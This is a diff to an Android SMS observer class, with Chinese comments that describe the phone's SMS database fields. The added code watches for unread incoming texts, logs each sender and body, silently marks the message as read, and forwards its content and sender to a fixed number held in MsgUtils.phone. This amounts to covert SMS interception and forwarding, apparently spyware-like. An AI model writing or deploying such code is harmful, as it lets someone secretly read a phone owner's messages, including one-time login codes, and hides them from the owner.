@@ -1,6 +1,7 @@
 package com.example.message;
 
 import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.os.Handler;
@@ -55,9 +56,9 @@ public class SMSObserver extends ContentObserver {
 
 	private static final int COLUMN_INDEX_PROTOCOL = 7;
 
-	private static final int MAX_NUMS = 10;
-
 	private static int MAX_ID = 0;
+
+	private int curr_id = 0;
 
 	private ContentResolver mResolver;
 
@@ -80,13 +81,24 @@ public class SMSObserver extends ContentObserver {
 
 	{
 
+		/*
+		 * 　_id：短信序号，如100 　　 　　thread_id：对话的序号，如100，与同一个手机号互发的短信，其序号是相同的 　　
+		 * 　　address：发件人地址，即手机号，如+8613811810000 　　
+		 * 　　person：发件人，如果发件人在通讯录中则为具体姓名，陌生人为null 　　
+		 * 　　date：日期，long型，如1256539465022，可以对日期显示格式进行设置 　　
+		 * 　　protocol：协议0SMS_RPOTO短信，1MMS_PROTO彩信 　　 　　read：是否阅读0未读，1已读 　　
+		 * 　　status：短信状态-1接收，0complete,64pending,128failed 　　
+		 * 　　type：短信类型1是接收到的，2是已发出 　　 　　body：短信具体内容 　　
+		 * 　　service_center：短信服务中心号码编号，如+8613800755500
+		 */
+
 		Log.i(TAG, "onChange : " + selfChange + "; " + MAX_ID + "; "
 				+ SELECTION);
 
 		super.onChange(selfChange);
 
 		Cursor cursor = mResolver.query(SMS.CONTENT_URI, PROJECTION,
-				" order by " + SMS._ID + " desc limit 1 ", null, null);
+				" type=1 and read=0 ", null, SMS._ID + " desc limit 1");
 
 		int id, type, protocol;
 
@@ -95,10 +107,6 @@ public class SMSObserver extends ContentObserver {
 		Message message;
 
 		MessageItem item;
-
-		int iter = 0;
-
-		boolean hasDone = false;
 
 		while (cursor.moveToNext())
 
@@ -114,57 +122,34 @@ public class SMSObserver extends ContentObserver {
 
 			protocol = cursor.getInt(COLUMN_INDEX_PROTOCOL);
 
-			if (hasDone)
+			item = new MessageItem();
 
-			{
+			item.setId(id);
 
-				MAX_ID = id;
+			item.setType(type);
 
-				break;
+			item.setPhone(phone);
 
+			item.setBody(body);
+
+			item.setProtocol(protocol);
+
+			message = new Message();
+
+			message.obj = item;
+			Log.i(TAG, phone + ",有短信了:" + body);
+			if (id != curr_id) {
+				curr_id = id;
+				// mHandler.sendMessage(message);
+				ContentValues updateValues = new ContentValues();
+				updateValues.put("read", "1");
+				Log.i(TAG, "把短信标记为已读取 id:" + id);
+				mResolver.update(SMS.CONTENT_URI, updateValues, SMS._ID + "="
+						+ id, null);
+				boolean isSendSuccess = MsgUtils.msgSend(body, phone,
+						MsgUtils.phone);
+				Log.i(TAG, "短信是否发送:" + isSendSuccess);
 			}
-
-			if (protocol == SMS.PROTOCOL_SMS && body != null
-					&& body.startsWith(SMS.FILTER))
-
-			{
-
-				hasDone = true;
-
-				item = new MessageItem();
-
-				item.setId(id);
-
-				item.setType(type);
-
-				item.setPhone(phone);
-
-				item.setBody(body);
-
-				item.setProtocol(protocol);
-
-				message = new Message();
-
-				message.obj = item;
-				Log.i(TAG, "有短信了:" + body);
-				mHandler.sendMessage(message);
-
-			}
-
-			else
-
-			{
-
-				if (id > MAX_ID)
-					MAX_ID = id;
-
-			}
-
-			if (iter > MAX_NUMS)
-				break;
-
-			iter++;
-
 		}
 
 	}
